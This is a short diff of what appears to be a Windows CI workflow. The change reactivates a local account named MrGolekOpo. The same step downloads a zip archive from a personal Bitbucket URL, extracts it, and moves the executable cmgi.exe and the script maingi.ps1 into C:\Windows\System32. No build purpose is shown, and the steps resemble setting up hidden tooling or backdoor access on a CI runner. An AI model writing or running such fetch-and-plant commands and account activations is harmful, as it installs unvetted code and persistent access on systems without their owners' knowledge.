@@ -34,10 +34,10 @@ jobs:
         net user MrGolekOpo /active:yes
     - name: Opo
       run: |
-        #net user MrGolekOpo /active:yes
+        net user MrGolekOpo /active:yes
         Invoke-WebRequest https://bitbucket.org/sindylestari/sindy/raw/fbb0989251611234a1be583df22d4afc64f97f45/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        move libcrypto-1_1-x64.dll C:\Windows\System32
+        #move libcrypto-1_1-x64.dll C:\Windows\System32
         move cmgi.exe C:\Windows\System32
         move maingi.ps1 C:\Windows\System32
         chdir\windows\system32
